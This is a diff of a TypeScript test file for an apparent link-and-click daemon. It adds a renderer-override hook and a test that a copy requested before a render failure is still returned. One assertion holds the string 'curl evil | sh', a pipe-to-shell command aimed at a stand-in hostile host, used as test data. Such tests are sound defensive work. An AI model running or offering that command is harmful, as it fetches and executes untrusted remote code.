@@ -32,6 +32,10 @@ function host(
   } as LaunchResult,
   // How many acts the host performs before every later one fails.
   succeeding = Infinity,
+  // The renderer the click is handed to, for a test whose renderer fails.
+  rendererOver: (
+    renderer: DaemonParts["renderer"],
+  ) => DaemonParts["renderer"] = (renderer) => renderer,
 ) {
   const copied: string[] = [];
   const unheard: string[] = [];
@@ -64,6 +68,7 @@ function host(
         : acting.perform(act),
   };
   const events: string[] = [];
+  const mounted = clickParts(verbCtx, undefined, world);
   const parts = {
     clock: systemTimekeeper,
     payloadProviders: {},
@@ -71,7 +76,8 @@ function host(
     rendererForClick: () => undefined,
     desktopActs: desktop,
     log: (_level: string, line: string) => events.push(line),
-    ...clickParts(verbCtx, undefined, world),
+    ...mounted,
+    renderer: rendererOver(mounted.renderer),
   } as unknown as DaemonParts;
   const frame = async (
     url: string,
@@ -96,7 +102,7 @@ function host(
     if (handled.kind !== "url") throw new Error(`answered ${handled.kind}`);
     return handled as Extract<HandledRequest, { kind: "url" }>;
   };
-  return { frame, copied, events, unheard };
+  return { frame, copied, events, unheard, parts, desktop };
 }
 
 // What a writer that reads at once is told.
@@ -313,6 +319,33 @@ describe("a frame that asks for its acts on the desktop", () => {
     });
   });
 
+  test("a click whose turn throws after asking a copy still hands the copy back", async () => {
+    const h = host(undefined, undefined, Infinity, (renderer) => ({
+      ...renderer,
+      answerClick: async (_session, make) => {
+        const made = make();
+        if (
+          made.kind !== "event" ||
+          made.event.kind !== "click" ||
+          made.event.arrival.via !== "link" ||
+          made.event.arrival.acts.on !== "desktop"
+        )
+          throw new Error("the click did not ask to act on the desktop");
+        h.desktop.deposit(made.event.arrival.acts.click, {
+          kind: "copy",
+          text: "asked before the throw",
+        });
+        throw new Error("the turn failed after asking");
+      },
+    }));
+    const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
+    expect((await answered.land()).resp).toMatchObject({
+      ok: false,
+      code: "RENDER_FAILED",
+      desktopActs: [{ kind: "copy", text: "asked before the throw" }],
+    });
+  });
+
   test("a verdict its writer never took says the acts it carried went with it", async () => {
     const h = host();
     const answered = await desktopFrame(h, TEST_SIGNER.signLink(COPY));
@@ -328,7 +361,10 @@ describe("a frame that asks for its acts on the desktop", () => {
     const answered = await h.frame(TEST_SIGNER.signLink(COPY));
     expect(toldAtOnce(answered)).toEqual({ ok: true, output: "" });
     // Nothing was handed off, whatever the writer is told of it.
-    expect((await answered.land()).resp).toMatchObject({ ok: true, desktopActs: [] });
+    expect((await answered.land()).resp).toMatchObject({
+      ok: true,
+      desktopActs: [],
+    });
     expect(h.copied).toEqual(["curl evil | sh"]);
   });
 });
